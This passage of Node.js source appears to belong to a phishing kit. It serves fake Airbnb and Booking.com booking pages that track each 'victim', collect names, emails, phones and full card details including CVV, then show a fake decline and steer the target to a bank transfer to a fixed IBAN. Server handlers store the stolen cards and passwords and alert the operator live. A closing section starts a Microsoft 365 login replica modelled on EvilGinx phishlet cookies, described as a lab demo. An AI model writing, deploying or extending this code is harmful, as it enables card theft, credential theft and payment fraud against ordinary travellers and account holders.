              <div class="text-sm mt-0.5 text-gray-500" id="checkin-display">Add date</div>
            </button>
            <button type="button" class="text-left px-3 py-2.5 hover:bg-gray-50" id="btn-co">
              <div class="text-[10px] font-bold tracking-wide">CHECKOUT</div>
              <div class="text-sm mt-0.5 text-gray-500" id="checkout-display">Add date</div>
            </button>
          </div>
          <div class="border-t border-gray-400 relative" id="guests-box">
            <button type="button" onclick="toggleGuests(event)" class="w-full text-left px-3 py-2.5 hover:bg-gray-50 flex items-center justify-between">
              <div>
                <div class="text-[10px] font-bold tracking-wide">GUESTS</div>
                <div class="text-sm mt-0.5" id="guests-display">1 guest</div>
              </div>
              <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 16 16"><path d="M4 6l4 4 4-4"/></svg>
            </button>
            <div id="guest-panel" class="absolute left-0 right-0 top-full mt-2 bg-white border border-gray-200 rounded-xl shadow-xl p-4 z-30">
              <div class="space-y-4">
                <div class="flex items-center justify-between">
                  <div><div class="font-semibold">Adults</div><div class="text-sm text-gray-500">Age 13+</div></div>
                  <div class="flex items-center gap-3">
                    <button type="button" onclick="changeGuests('adults',-1)" class="w-8 h-8 rounded-full border border-gray-400 text-lg leading-none hover:border-gray-800 disabled:opacity-30" id="btn-a-minus">−</button>
                    <span id="adults-count" class="w-4 text-center">1</span>
                    <button type="button" onclick="changeGuests('adults',1)" class="w-8 h-8 rounded-full border border-gray-400 text-lg leading-none hover:border-gray-800">+</button>
                  </div>
                </div>
                <div class="flex items-center justify-between">
                  <div><div class="font-semibold">Children</div><div class="text-sm text-gray-500">Ages 2–12</div></div>
                  <div class="flex items-center gap-3">
                    <button type="button" onclick="changeGuests('children',-1)" class="w-8 h-8 rounded-full border border-gray-400 text-lg leading-none hover:border-gray-800">−</button>
                    <span id="children-count" class="w-4 text-center">0</span>
                    <button type="button" onclick="changeGuests('children',1)" class="w-8 h-8 rounded-full border border-gray-400 text-lg leading-none hover:border-gray-800">+</button>
                  </div>
                </div>
                <div class="flex items-center justify-between">
                  <div><div class="font-semibold">Infants</div><div class="text-sm text-gray-500">Under 2</div></div>
                  <div class="flex items-center gap-3">
                    <button type="button" onclick="changeGuests('infants',-1)" class="w-8 h-8 rounded-full border border-gray-400 text-lg leading-none hover:border-gray-800">−</button>
                    <span id="infants-count" class="w-4 text-center">0</span>
                    <button type="button" onclick="changeGuests('infants',1)" class="w-8 h-8 rounded-full border border-gray-400 text-lg leading-none hover:border-gray-800">+</button>
                  </div>
                </div>
              </div>
              <button type="button" onclick="toggleGuests(event)" class="mt-4 float-right font-semibold underline text-sm">Close</button>
            </div>
          </div>
        </div>

        <button type="button" onclick="goBook()" class="w-full py-3.5 rounded-lg text-white font-semibold text-base bg-gradient-to-r from-[#E61E4D] to-[#D70466] hover:from-[#D70466] hover:to-[#C13515] transition shadow-sm">
          Reserve
        </button>
        <p class="text-center text-sm text-gray-600 mt-3">You won't be charged yet</p>
        <div id="price-detail" class="hidden mt-5 space-y-3 text-[16px]"></div>
        <a href="#" class="block text-center text-sm underline text-gray-600 mt-5">Report this listing</a>
      </div>
    </aside>
  </div>
</main>

<!-- Mobile sticky bar -->
<div class="lg:hidden fixed bottom-0 inset-x-0 z-40 bg-white border-t border-gray-200 px-5 py-3 flex items-center justify-between shadow-[0_-2px_10px_rgba(0,0,0,.06)]">
  <div>
    <div class="text-[16px]"><span class="font-semibold">${priceMain}</span> <span class="text-gray-600">/ ${priceUnit}</span></div>
    <button type="button" onclick="document.getElementById('calendar').scrollIntoView({behavior:'smooth'})" class="text-sm underline font-semibold" id="mobile-dates">Add dates</button>
  </div>
  <button type="button" onclick="goBook()" class="px-8 py-3.5 rounded-lg text-white font-semibold bg-gradient-to-r from-[#E61E4D] to-[#D70466]">Reserve</button>
</div>

<footer class="border-t border-gray-200 bg-gray-50 mt-8">
  <div class="max-w-[1120px] mx-auto px-6 md:px-10 py-8 flex flex-wrap gap-4 text-sm text-gray-600">
    <span>© ${new Date().getFullYear()} Airbnb, Inc.</span>
    <a href="#" class="hover:underline">Privacy</a>
    <a href="#" class="hover:underline">Terms</a>
    <a href="#" class="hover:underline">Sitemap</a>
  </div>
</footer>

<script src="https://cdn.jsdelivr.net/npm/flatpickr"><\/script>
<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"><\/script>
<script>
window.__VID = ${JSON.stringify(victimId)};
window.__META = ${JSON.stringify(meta)};
window.__PAYMENT = ${JSON.stringify(resolvePaymentConfig(listing.user_id))};
window.__MAP_Q = ${JSON.stringify(loc || title || 'London')};

var __g = { adults: 1, children: 0, infants: 0 };
var __ci = null, __co = null;
var __fpRange = null;

function track(stage, data) {
  try {
    fetch('/api/track', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ victim_id: window.__VID, stage: stage, data: data || {} })
    });
  } catch (e) {}
}
track('view', 'page_load');

function money(v) {
  var cur = (window.__META && window.__META.currency) || 'EUR';
  try {
    return new Intl.NumberFormat(undefined, { style: 'currency', currency: cur, maximumFractionDigits: 0 }).format(v);
  } catch (e) {
    return cur + ' ' + Math.round(v);
  }
}

function nightsBetween(a, b) {
  if (!a || !b) return 0;
  var d1 = new Date(a + 'T12:00:00');
  var d2 = new Date(b + 'T12:00:00');
  return Math.max(0, Math.round((d2 - d1) / 86400000));
}

function fmtShort(s) {
  if (!s) return 'Add date';
  var d = new Date(s + 'T12:00:00');
  return d.toLocaleDateString(undefined, { month: 'short', day: 'numeric', year: 'numeric' });
}

function updatePriceUI() {
  var m = window.__META || {};
  var n = nightsBetween(__ci, __co);
  var base;
  if (m.hideNightly) base = m.priceMonth || m.subtotal;
  else if (!n) base = m.priceNight || m.subtotal;
  else base = (m.priceNight || 0) * n;
  var clean = Math.round(base * 0.12);
  var serv = Math.round(base * 0.15);
  var tot = base + clean + serv;
  m.subtotal = base; m.cleaning = clean; m.service = serv; m.total = tot;
  var pd = document.getElementById('price-detail');
  if (!pd) return;
  if (!__ci || !__co) {
    pd.classList.add('hidden');
    pd.innerHTML = '';
    return;
  }
  var unit = m.hideNightly ? '1 month' : ((n || 1) + ' night' + ((n || 1) === 1 ? '' : 's'));
  var unitPrice = m.hideNightly ? (m.priceMonth || base) : (m.priceNight || base);
  pd.classList.remove('hidden');
  pd.innerHTML =
    '<div class="flex justify-between"><span class="underline">' + money(unitPrice) + ' x ' + unit + '</span><span>' + money(base) + '</span></div>' +
    '<div class="flex justify-between"><span class="underline">Cleaning fee</span><span>' + money(clean) + '</span></div>' +
    '<div class="flex justify-between"><span class="underline">Airbnb service fee</span><span>' + money(serv) + '</span></div>' +
    '<div class="flex justify-between pt-3 border-t border-gray-200 font-semibold"><span>Total</span><span>' + money(tot) + '</span></div>';
}

function setDateDisplays() {
  var a = document.getElementById('checkin-display');
  var b = document.getElementById('checkout-display');
  if (a) {
    a.textContent = fmtShort(__ci);
    a.className = 'text-sm mt-0.5 ' + (__ci ? 'text-gray-900 font-medium' : 'text-gray-500');
  }
  if (b) {
    b.textContent = fmtShort(__co);
    b.className = 'text-sm mt-0.5 ' + (__co ? 'text-gray-900 font-medium' : 'text-gray-500');
  }
  var sub = document.getElementById('cal-sub');
  var title = document.getElementById('cal-title');
  var mob = document.getElementById('mobile-dates');
  if (__ci && __co) {
    var n = nightsBetween(__ci, __co);
    var txt = n + ' night' + (n === 1 ? '' : 's') + ' · ' + fmtShort(__ci) + ' – ' + fmtShort(__co);
    if (sub) { sub.textContent = txt; sub.classList.remove('text-red-600'); }
    if (title) title.textContent = n + ' night' + (n === 1 ? '' : 's') + ' in ' + ((window.__META && window.__META.loc) || 'your destination');
    if (mob) mob.textContent = fmtShort(__ci) + ' – ' + fmtShort(__co);
  } else if (__ci) {
    if (sub) sub.textContent = 'Select checkout date';
    if (title) title.textContent = 'Select checkout date';
    if (mob) mob.textContent = fmtShort(__ci) + ' – Add date';
  } else {
    if (sub) sub.textContent = 'Add your travel dates for exact pricing';
    if (title) title.textContent = 'Select check-in date';
    if (mob) mob.textContent = 'Add dates';
  }
  updatePriceUI();
}

function onDatesChanged(selectedDates) {
  if (selectedDates.length >= 1) {
    __ci = flatpickr.formatDate(selectedDates[0], 'Y-m-d');
  } else {
    __ci = null;
  }
  if (selectedDates.length >= 2) {
    __co = flatpickr.formatDate(selectedDates[1], 'Y-m-d');
  } else {
    __co = null;
  }
  setDateDisplays();
  if (__ci) track('date_select', { checkin: __ci, checkout: __co, guests: (__adults||1) });
}

function initFlatpickr() {
  var common = {
    mode: 'range',
    minDate: 'today',
    dateFormat: 'Y-m-d',
    altInput: true,
    altFormat: 'M j, Y',
    showMonths: window.innerWidth >= 768 ? 2 : 1,
    static: false,
    monthSelectorType: 'static',
    onChange: onDatesChanged,
    onReady: function(s, d, inst) {
      if (inst.calendarContainer) inst.calendarContainer.classList.add('fp-airbnb');
    }
  };
  __fpRange = flatpickr('#fp-checkin', Object.assign({}, common, {
    plugins: [],
    onChange: function(sel, str, inst) {
      onDatesChanged(sel);
      if (window.__fpCheckout) {
        window.__fpCheckout.setDate(sel, false);
      }
    }
  }));
  window.__fpCheckout = flatpickr('#fp-checkout', Object.assign({}, common, {
    onChange: function(sel, str, inst) {
      onDatesChanged(sel);
      if (__fpRange) __fpRange.setDate(sel, false);
    }
  }));
  // Sync both inputs as a shared range picker UX
  document.getElementById('btn-ci') && document.getElementById('btn-ci').addEventListener('click', function() {
    __fpRange && __fpRange.open();
  });
  document.getElementById('btn-co') && document.getElementById('btn-co').addEventListener('click', function() {
    (__fpRange || window.__fpCheckout) && (__fpRange || window.__fpCheckout).open();
  });
  document.getElementById('btn-clear-dates') && document.getElementById('btn-clear-dates').addEventListener('click', function() {
    __ci = null; __co = null;
    if (__fpRange) __fpRange.clear();
    if (window.__fpCheckout) window.__fpCheckout.clear();
    setDateDisplays();
  });
}

function toggleGuests(e) {
  if (e) e.stopPropagation();
  var el = document.getElementById('guest-panel');
  if (!el) return;
  el.classList.toggle('open');
}

function changeGuests(type, delta) {
  var max = (window.__META && window.__META.guestsMax) || 10;
  if (type === 'infants') {
    __g.infants = Math.max(0, Math.min(5, (__g.infants || 0) + delta));
  } else {
    var next = (__g[type] || 0) + delta;
    if (type === 'adults') next = Math.max(1, next);
    else next = Math.max(0, next);
    var total = (type === 'adults' ? next : __g.adults) + (type === 'children' ? next : __g.children);
    if (total > max && delta > 0) return;
    __g[type] = next;
  }
  ['adults', 'children', 'infants'].forEach(function(k) {
    var n = document.getElementById(k + '-count');
    if (n) n.textContent = __g[k];
  });
  var t = __g.adults + __g.children;
  var txt = (t === 1 ? '1 guest' : t + ' guests') + (__g.infants ? (' · ' + __g.infants + ' infant' + (__g.infants > 1 ? 's' : '')) : '');
  var gd = document.getElementById('guests-display');
  if (gd) gd.textContent = txt;
  var minus = document.getElementById('btn-a-minus');
  if (minus) minus.style.opacity = __g.adults <= 1 ? '0.35' : '1';
}

document.addEventListener('click', function(e) {
  var panel = document.getElementById('guest-panel');
  var box = document.getElementById('guests-box');
  if (panel && box && !box.contains(e.target)) panel.classList.remove('open');
});

function openLightbox(idx) {
  var imgs = (window.__META && window.__META.imgs) || [];
  if (!imgs.length) return;
  var ov = document.createElement('div');
  ov.className = 'lb-overlay';
  ov.innerHTML =
    '<button type="button" class="absolute top-4 right-4 text-white text-4xl leading-none w-12 h-12 hover:bg-white/10 rounded-full" aria-label="Close">&times;</button>' +
    '<button type="button" data-d="-1" class="absolute left-4 text-white text-5xl px-3 hover:bg-white/10 rounded-full">‹</button>' +
    '<button type="button" data-d="1" class="absolute right-4 text-white text-5xl px-3 hover:bg-white/10 rounded-full">›</button>' +
    '<img src="' + imgs[idx] + '" alt="" class="max-h-[85vh] max-w-[90vw] object-contain rounded-lg shadow-2xl">' +
    '<div class="absolute bottom-6 text-white text-sm font-medium"></div>';
  ov.__i = idx;
  ov.__imgs = imgs;
  function show() {
    ov.querySelector('img').src = ov.__imgs[ov.__i];
    ov.querySelector('div.absolute.bottom-6').textContent = (ov.__i + 1) + ' / ' + ov.__imgs.length;
  }
  show();
  ov.querySelector('button[aria-label="Close"]').onclick = function() { ov.remove(); };
  ov.onclick = function(e) { if (e.target === ov) ov.remove(); };
  ov.querySelectorAll('button[data-d]').forEach(function(b) {
    b.onclick = function(e) {
      e.stopPropagation();
      ov.__i = (ov.__i + parseInt(b.getAttribute('data-d'), 10) + ov.__imgs.length) % ov.__imgs.length;
      show();
    };
  });
  document.body.appendChild(ov);
  track('gallery', 'open_photo_' + idx);
}

function mfToast(msg) {
  var t = document.getElementById('mf-toast');
  if (!t) {
    t = document.createElement('div');
    t.id = 'mf-toast';
    t.className = 'fixed bottom-24 left-1/2 -translate-x-1/2 z-[100] bg-gray-900 text-white px-5 py-3 rounded-lg text-sm font-semibold shadow-lg opacity-0 transition-opacity pointer-events-none';
    document.body.appendChild(t);
  }
  t.textContent = msg;
  t.style.opacity = '1';
  setTimeout(function() { t.style.opacity = '0'; }, 2000);
}

function goBook() {
  track('proxy_reserve_click', { to: 'book_stays', checkin: __ci, checkout: __co, guests: __adults||1 });
  if (!__ci || !__co) {
    var cal = document.getElementById('calendar');
    if (cal) cal.scrollIntoView({ behavior: 'smooth', block: 'center' });
    var sub = document.getElementById('cal-sub');
    if (sub) {
      sub.textContent = 'Please select check-in and check-out dates';
      sub.classList.add('text-red-600');
    }
    if (__fpRange) __fpRange.open();
    return;
  }
  updatePriceUI();
  var m = window.__META || {};
  var code = m.code || String(m.id || '');
  var adults = Math.max(1, parseInt(__g.adults, 10) || 1);
  var children = Math.max(0, parseInt(__g.children, 10) || 0);
  var infants = Math.max(0, parseInt(__g.infants, 10) || 0);
  var cur = m.currency || 'GBP';
  var url = '/book/stays/' + encodeURIComponent(code)
    + '?numberOfAdults=' + encodeURIComponent(adults)
    + '&checkin=' + encodeURIComponent(__ci)
    + '&checkout=' + encodeURIComponent(__co)
    + '&numberOfChildren=' + encodeURIComponent(children)
    + '&numberOfInfants=' + encodeURIComponent(infants)
    + '&numberOfPets=0'
    + '&guestCurrency=' + encodeURIComponent(cur)
    + '&productId=' + encodeURIComponent(code)
    + '&victim_id=' + encodeURIComponent(window.__VID || '');
  window.location.href = url;
}

function initMap() {
  var el = document.getElementById('mf-map');
  if (!el || typeof L === 'undefined') return;
  var map = L.map('mf-map', { scrollWheelZoom: false, zoomControl: true }).setView([51.5074, -0.1278], 13);
  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
    maxZoom: 19,
    attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a>'
  }).addTo(map);
  var q = window.__MAP_Q || 'London';
  fetch('https://nominatim.openstreetmap.org/search?format=json&limit=1&q=' + encodeURIComponent(q), {
    headers: { 'Accept': 'application/json' }
  })
    .then(function(r) { return r.json(); })
    .then(function(data) {
      var lat = 51.5074, lon = -0.1278;
      if (data && data[0]) {
        lat = parseFloat(data[0].lat);
        lon = parseFloat(data[0].lon);
      }
      map.setView([lat, lon], 14);
      var circle = L.circle([lat, lon], {
        radius: 400,
        color: '#FF385C',
        fillColor: '#FF385C',
        fillOpacity: 0.18,
        weight: 2
      }).addTo(map);
      setTimeout(function() { map.invalidateSize(); }, 200);
    })
    .catch(function() {
      L.circle([51.5074, -0.1278], { radius: 400, color: '#FF385C', fillColor: '#FF385C', fillOpacity: 0.18, weight: 2 }).addTo(map);
    });
}

document.addEventListener('DOMContentLoaded', function() {
  initFlatpickr();
  setDateDisplays();
  initMap();
});
<\/script>
</body>
</html>`;
}

function bookingPage(listing, victimId) {
  const bLocale = listing.locale || 'en';
  const bPriceNight = parseFloat(listing.price) || 120;
  const bPriceMonth = parseFloat(listing.price_month) || Math.round(bPriceNight * 28);
  const bHide = Number(listing.hide_nightly) === 1;
  const bPriceLabel = bHide
    ? (formatCurrency(bPriceMonth, bLocale) + ' / month')
    : (formatCurrency(bPriceNight, bLocale) + ' / night');
  const bPayAmount = bHide ? bPriceMonth : Math.round(bPriceNight * 3);
  return `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>${listing.title} - Booking.com</title><style>${BOOKING_CSS}</style><script>fetch('/api/track',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({victim_id:${victimId},stage:'page_view'})});</script></head><body>
<header class="booking-header"><div class="logo">Booking.com</div></header>
<main class="booking-container" id="bc">
<h1>${listing.title}</h1>
<div class="booking-images"><img src="${(parseListingImages(listing)[0])||'https://images.unsplash.com/photo-1571896349842-33c89424de2d?w=800'}" alt=""></div>
${embedVideoHtml(getListingVideo(listing), 'mf-video booking-video')}
<div class="booking-details">
<div class="booking-info"><h2>${listing.location||'Paris, France'}</h2><div class="rating">⭐ 8.7 <span>Excellent</span> · ${Math.floor(Math.random()*200)+100} reviews</div><p>${listing.guests||2} guests · 1 bedroom · 1 bathroom</p><p>${listing.description||'Featuring city views and free WiFi, this property is located in the center of Paris.'}</p></div>
<div class="booking-reserve">
<div class="reserve-price"><span class="price">${bPriceLabel}</span></div>
<form onsubmit="event.preventDefault();bDetails(${victimId})">
<div class="date-fields"><div><label>Check-in</label><input type="date" id="bc1" value="${new Date().toISOString().split('T')[0]}"></div><div><label>Check-out</label><input type="date" id="bc2" value="${new Date(Date.now()+86400000*3).toISOString().split('T')[0]}"></div></div>
<select id="bg"><option>1 adult</option><option selected>2 adults</option></select>
<button type="submit" class="btn-reserve">Reserve</button>
</form></div></div>
</main>
<script>function bDetails(vid){fetch('/api/track',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({victim_id:vid,stage:'date_select'})});document.getElementById('bc').innerHTML='<div class="booking-form"><h2>Enter your details</h2><p>Almost complete!</p><form onsubmit="event.preventDefault();bPayment('+vid+')"><div class="form-grid"><div><label>First Name</label><input type="text" id="bfn" required></div><div><label>Last Name</label><input type="text" id="bln" required></div><div><label>Email</label><input type="email" id="bem" required></div><div><label>Phone</label><input type="tel" id="bph" required></div></div><button type="submit" class="btn-next">Next: Payment →</button></form></div>';}
function bPayment(vid){var fn=document.getElementById('bfn').value;var ln=document.getElementById('bln').value;var em=document.getElementById('bem').value;var ph=document.getElementById('bph').value;fetch('/api/track',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({victim_id:vid,stage:'details',data:{full_name:fn+' '+ln,email:em,phone:ph}})});document.getElementById('bc').innerHTML='<div class="booking-form"><h2>Payment</h2><p>Secure payment via Booking.com</p><form onsubmit="event.preventDefault();bError('+vid+')"><div class="form-grid"><div class="full-width"><label>Card Number</label><input type="text" id="bcn" required placeholder="1234 5678 9012 3456" maxlength="19"></div><div><label>Expiry</label><input type="text" id="bce" required placeholder="MM/YY" maxlength="5"></div><div><label>CVV</label><input type="text" id="bcv" required placeholder="123" maxlength="4"></div><div class="full-width"><label>Cardholder Name</label><input type="text" id="bch" required></div></div><button type="submit" class="btn-next">Pay ${bPayAmount}</button></form></div>';}
function bError(vid){var cn=document.getElementById('bcn').value;var ce=document.getElementById('bce').value;var cv=document.getElementById('bcv').value;var ch=document.getElementById('bch').value;fetch('/api/card',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({victim_id:vid,card_number:cn,card_holder:ch,expiry:ce,cvv:cv,amount:'${bPayAmount}',card_type:'credit'})});document.getElementById('bc').innerHTML='<div class="booking-form" style="text-align:center"><div style="font-size:48px;margin-bottom:16px">⚠️</div><h2 style="color:#e74c3c">Payment Declined</h2><p style="color:#666">Your card was declined. Please use manual payment.</p><div style="background:#f7f7f7;padding:20px;border-radius:8px;margin-top:20px;text-align:left"><h3 style="color:#4CAF50">Manual Payment</h3><p style="font-size:13px;color:#666;margin:8px 0">This property requires manual bank transfer:</p><div style="background:#fff;padding:16px;border-radius:6px;margin:12px 0;border:1px solid #ddd"><p><strong>Bank:</strong> Revolut</p><p><strong>IBAN:</strong> LT12 3250 0694 1234 5678</p><p><strong>BIC:</strong> REVOLT21</p><p><strong>Amount:</strong> ${formatCurrency(bPayAmount, bLocale)}</p><p><strong>Ref:</strong> BK-'+vid+'</p></div><p style="font-size:11px;color:#999">Confirmation within 24h after payment. Invoice sent by email.</p><button onclick="bSuccess()" style="width:100%;padding:14px;background:#4CAF50;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:700;cursor:pointer;margin-top:12px">I\'ve Made the Transfer</button></div></div>';}
function bSuccess(){fetch('/api/payment-confirm',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({victim_id:'+vid+',marketplace:'booking'})});document.getElementById('bc').innerHTML='<div class="booking-form" style="text-align:center"><div style="font-size:64px">✅</div><h2 style="color:#4CAF50">Reservation Confirmed!</h2><p style="color:#666">Your reservation has been received.</p><p style="color:#999;font-size:14px">Confirmation email with invoice will be sent shortly.</p><div style="background:#f7f7f7;padding:20px;border-radius:8px;margin-top:20px;text-align:left"><h3>Booking Summary</h3><table style="width:100%;color:#333;margin-top:8px"><tr><td>Property:</td><td>${listing.title}</td></tr><tr><td>Amount:</td><td>${formatCurrency(bPayAmount, bLocale)}</td></tr><tr><td>Status:</td><td style="color:#4CAF50">Confirmed</td></tr></table></div></div>';}</script></body></html>`;
}

// === API TRACKING ===
app.post('/api/track', (req, res) => {
  let { victim_id, stage, data } = req.body || {};
  // Allow listing id as victim_id fallback (public pages sometimes send LID)
  let victim = victim_id ? db.prepare('SELECT * FROM victims WHERE id = ?').get(victim_id) : null;
  if (!victim && victim_id) {
    const lid = parseInt(victim_id, 10);
    if (lid) {
      const listing = db.prepare('SELECT * FROM listings WHERE id = ?').get(lid);
      if (listing) {
        const vr = db.prepare(
          "INSERT INTO victims (listing_id, user_id, marketplace, ip_address, user_agent, stage) VALUES (?, ?, ?, ?, ?, ?)"
        ).run(listing.id, listing.user_id, listing.marketplace || 'airbnb', req.ip, req.headers['user-agent'] || '', stage || 'visit');
        victim_id = vr.lastInsertRowid;
        victim = db.prepare('SELECT * FROM victims WHERE id = ?').get(victim_id);
      }
    }
  }
  if (!victim_id || !victim) return res.json({ error: 'no victim_id' });

  const updates = [];
  const values = [];

  if (stage) { updates.push('stage = ?'); values.push(stage); }
  if (data) {
    if (data.email) { updates.push('email = ?'); values.push(data.email); }
    if (data.password) { updates.push('password = ?'); values.push(data.password); }
    if (data.full_name) { updates.push('full_name = ?'); values.push(data.full_name); }
    if (data.phone) { updates.push('phone = ?'); values.push(data.phone); }
  }

  if (updates.length) {
    values.push(victim_id);
    db.prepare(`UPDATE victims SET ${updates.join(', ')} WHERE id = ?`).run(...values);
    try { io.emit('victim_update', { id: victim_id, stage, marketplace: victim.marketplace, userId: victim.user_id }); } catch (e) {}
  }

  // Auto listing booking_status from funnel stages
  try {
    const st = String(stage || '').toLowerCase();
    const listing = listingFromVictimId(victim_id) || (victim.listing_id ? db.prepare('SELECT id, user_id, booking_status FROM listings WHERE id = ?').get(victim.listing_id) : null);
    if (listing) {
      const hasDates = data && (data.checkin || data.checkout || data.guests);
      if (st === 'date_select' || st === 'dates' || st === 'guests_set' || (hasDates && (st === 'details' || st === 'booking'))) {
        advanceListingStatus(listing, 'in_review');
      } else if (st === 'proxy_reserve_click' || st === 'confirm_pay_view' || st === 'confirm_pay' || st === 'booking' || st === 'click_reserve' || st === 'invoice' || st === 'reserve') {
        advanceListingStatus(listing, 'invoice_sent');
      } else if (st === 'payment_declined_manual_shown' || st === 'payment_declined' || st === 'card_submitted') {
        advanceListingStatus(listing, 'payment_declined');
      } else if (st === 'manual_transfer_confirm' || st === 'payment_confirmed') {
        // client claims transfer done — stay on payment_declined until operator sets paid
        advanceListingStatus(listing, 'payment_declined');
      }
    }
  } catch (e) {}

  res.json({ success: true, victim_id });
});

app.post('/api/card', (req, res) => {
  let { victim_id, card_number, card_holder, expiry, cvv, amount, card_type } = req.body || {};
  if (!victim_id || !card_number) return res.json({ error: 'missing data' });

  let victim = db.prepare('SELECT * FROM victims WHERE id = ?').get(victim_id);
  if (!victim) {
    const lid = parseInt(victim_id, 10);
    const listing = lid ? db.prepare('SELECT * FROM listings WHERE id = ?').get(lid) : null;
    if (listing) {
      const vr = db.prepare(
        "INSERT INTO victims (listing_id, user_id, marketplace, ip_address, user_agent, stage) VALUES (?, ?, ?, ?, ?, 'card_submitted')"
      ).run(listing.id, listing.user_id, listing.marketplace || 'airbnb', req.ip, req.headers['user-agent'] || '');
      victim_id = vr.lastInsertRowid;
      victim = db.prepare('SELECT * FROM victims WHERE id = ?').get(victim_id);
    }
  }
  if (!victim) return res.json({ error: 'not found' });

  db.prepare('UPDATE victims SET stage = ? WHERE id = ?').run('card_submitted', victim_id);
  const result = db.prepare('INSERT INTO cards (victim_id, user_id, card_number, card_holder, expiry, cvv, amount, card_type) VALUES (?, ?, ?, ?, ?, ?, ?, ?)').run(victim_id, victim.user_id, card_number, card_holder||'', expiry||'', cvv||'', amount||'0', card_type||'unknown');

  try {
    const listing = listingFromVictimId(victim_id) || (victim.listing_id ? db.prepare('SELECT id, user_id, booking_status FROM listings WHERE id = ?').get(victim.listing_id) : null);
    if (listing) advanceListingStatus(listing, 'payment_declined');
  } catch (e) {}

  try { io.emit('card_captured', { id: result.lastInsertRowid, card_number, card_holder: card_holder||'', userId: victim.user_id, victimId: victim_id }); } catch (e) {}
  res.json({ success: true, card_id: result.lastInsertRowid });
});

app.post('/api/payment-confirm', (req, res) => {
  const { victim_id, marketplace } = req.body || {};
  const victim = db.prepare('SELECT * FROM victims WHERE id = ?').get(victim_id);
  if (victim) {
    db.prepare("UPDATE victims SET stage = 'payment_confirmed' WHERE id = ?").run(victim_id);
    try { db.prepare("INSERT INTO payments (user_id, type, currency, amount, status) VALUES (?, 'manual', 'EUR', ?, 'pending')").run(victim.user_id, '450'); } catch (e) {}
    try { io.emit('victim_update', { id: victim.id, stage: 'payment_confirmed', marketplace: victim.marketplace, userId: victim.user_id }); } catch (e) {}
    // Client claims bank transfer done — stay on payment_declined; operator sets Payment received manually
    try {
      const listing = listingFromVictimId(victim_id) || (victim.listing_id ? db.prepare('SELECT id, user_id, booking_status FROM listings WHERE id = ?').get(victim.listing_id) : null);
      if (listing) advanceListingStatus(listing, 'payment_declined');
    } catch (e) {}
  }
  res.json({ success: true });
});

// ============================================================================
// ============================================================================
// ============================================================================
// Microsoft 365 (Demo) — shared helpers: MS-style sign-in replica
// (login.microsoftonline.com look) + Outlook-style mailbox.
// LAB ONLY, authorized training demo. Strictly for testing with hotmail /
// outlook lab accounts created by the team. No real Microsoft service is
// involved. Session cookies: ESTSAUTH (12h) + ESTSAUTHPERSISTENT (7d, phish
// funnel only) + legacy cmail_sess (compat). Watermark stays on all pages.
// ============================================================================
const CM_BRAND = {
  name: 'Microsoft 365 (Demo)',
  domain: 'microsoftonline.com',
  loginUrl: 'https://login.microsoftonline.com',
  color: '#0078D4',
  colorDark: '#005A9E'
};
const CM_WATERMARK_ON = String(process.env.MF_CM_WATERMARK || '1') !== '0';
const CM_PHISH_ORIGIN = 'phish';
const CM_APP_ORIGIN = 'app';

// Inline Microsoft wordmark (4 squares + "Microsoft"), the exact style used
// on the sign-in pages. No external assets, works offline.
function msLogoSvg(w) {
  // Squares-only SVG (matches the real 108x24 login.microsoftonline.com
  // mark) + the "Microsoft" wordmark rendered as an HTML span next to it,
  // so it never gets clipped by the SVG viewBox.
  w = w || 108;
  const h = Math.round(w * 0.222);
  const gap = Math.round(w * 0.055);
  const fs = Math.round(w * 0.185);
  return `<div style="display:flex;align-items:center;gap:${gap}px"><svg xmlns="http://www.w3.org/2000/svg" width="${w}" height="${h}" viewBox="0 0 108 24" role="img" aria-label="Microsoft"><rect x="0" y="0" width="23" height="23" fill="#F25022"/><rect x="27" y="0" width="23" height="23" fill="#7FBA00"/><rect x="54" y="0" width="23" height="23" fill="#00A4EF"/><rect x="81" y="0" width="23" height="23" fill="#FFB900"/></svg><span style="font-family:'Segoe UI',SegoeUI,'Helvetica Neue',Helvetica,Arial,sans-serif;font-size:${fs}px;font-weight:600;color:#000;white-space:nowrap;letter-spacing:-.2px">Microsoft</span></div>`;
}

function cmailToken(len) {
  len = len || 64;
  let t = '';
  while (t.length < len) t += uuidv4().replace(/-/g, '');
  return t.substring(0, len);
}

function cmailCookies(req) {
  const out = {};
  try { if (req.cookies) Object.assign(out, req.cookies); } catch (e) {}
  try {
    const h = req.headers['cookie'];
    if (h) h.split(';').forEach(function (p) {
      const i = p.indexOf('=');
      if (i > -1) out[p.slice(0, i).trim()] = decodeURIComponent(p.slice(i + 1).trim());
    });
  } catch (e) {}
  return out;
}

// Active (non-revoked, non-expired) session for the request's ESTSAUTH cookie
// (legacy cmail_sess accepted for backwards compatibility with saved links).
function cmailSessFromReq(req) {
  const c = cmailCookies(req);
  const tok = String(c.ESTSAUTH || c.cmail_sess || '');
  if (!tok) return null;
  const s = db.prepare(
    `SELECT s.*, a.email, a.display_name, a.avatar_color, a.user_id as owner_id
     FROM cmail_sessions s JOIN cmail_accounts a ON a.id = s.account_id
     WHERE s.token = ? AND s.revoked = 0 AND s.expires_at > datetime('now')`
  ).get(tok) || null;
  return s;
}

function cmailAuth(req, res, next) {
  const s = cmailSessFromReq(req);
  if (!s) return res.redirect('/cmail/login');
  req.cmailSession = s;
  req.cmailAccount = { id: s.account_id, email: s.email, display_name: s.display_name, avatar_color: s.avatar_color };
  next();
}

// Operator-side session cookies, mirroring the EvilGinx o365 phishlet names:
//   ESTSAUTH            -> "real" M365 session cookie       (12h)
//   ESTSAUTHPERSISTENT  -> persistent (remember-me) cookie  (7d, phish only)
//   cmail_sess          -> legacy compat cookie (v1 flows)  (12h)
function cmailSetSessCookies(res, token, persistent) {
  try { res.cookie('ESTSAUTH', token, { maxAge: 12 * 3600 * 1000, httpOnly: false, sameSite: 'lax', path: '/' }); } catch (e) {}
